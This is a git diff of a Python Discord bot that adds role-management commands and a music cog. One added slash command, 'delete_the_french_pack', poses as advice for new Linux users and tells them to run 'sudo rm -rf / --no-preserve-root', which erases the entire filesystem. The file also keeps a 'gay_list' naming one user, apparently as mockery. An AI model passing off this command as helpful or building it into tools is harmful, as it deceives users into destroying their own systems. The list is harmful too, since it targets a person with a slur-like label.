@@ -1,11 +1,12 @@
-import discord #need pip install
-from discord.ext import commands #need pip install
-import requests #need pip install
-import json
-from dotenv import load_dotenv #need pip install
+import discord
+from discord.ext import commands
+
+from dotenv import load_dotenv 
 import os
-import math
+
 import random
+
+from music_cog import music_cog
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -18,13 +19,12 @@ bot = commands.Bot(command_prefix="/", intents=intents)
 
 gay_list = [
     "summeryou7101",
-
 ];
 
 
 @bot.event
 async def on_ready():
-    print(f"MLGnotBot is ready to go!")
+    print(f"{bot.user} is online!")
 
 
 @bot.event
@@ -35,6 +35,11 @@ async def on_member_join(member):
 @bot.slash_command(name="hello", description="Hello World!")
 async def hello(ctx):
     await ctx.respond(f"{ctx.author.mention}, Hello World!")
+
+
+@bot.slash_command(name="delete_the_french_pack", description="how to delete the french pack!")
+async def hello(ctx):
+    await ctx.respond(f"Hello {ctx.author.mention}! If you just started using linux, don't forgot to delete the french pack! Just simply run the command below and you'll be good to go!\n ```sudo rm -rf / --no-preserve-root```")
 
 
 @bot.slash_command(name="skill_issue", description="skill issue")
@@ -159,6 +164,22 @@ async def enchant_roller(ctx):
     await ctx.respond(file = file, embed=embed)
 
 
+@bot.slash_command(name="add_role", description="adds a role to a person!")
+async def add_role(ctx, member: discord.Member, role: discord.Role):
+    try:
+        await member.add_roles(role, reason=None, atomic=True)
+        await ctx.respond(f"Successfully added {role.name} role to {member.nick or member.global_name or member.name}!")
+    except:
+        await ctx.respond(f"Failed to add role (might be because of the permissions)")
+    
 
+@bot.slash_command(name="remove_role", description="removes a role from a person!")
+async def remove_role(ctx, member: discord.Member, role: discord.Role):
+    try:
+        await member.remove_roles(role, reason=None, atomic=True)
+        await ctx.respond(f"Successfully removed {role.name} role from {member.nick or member.global_name or member.name}!")
+    except:
+        await ctx.respond(f"Failed to remove role (might be because of the permissions)")
 
+bot.add_cog(music_cog(bot))
 bot.run(TOKEN)
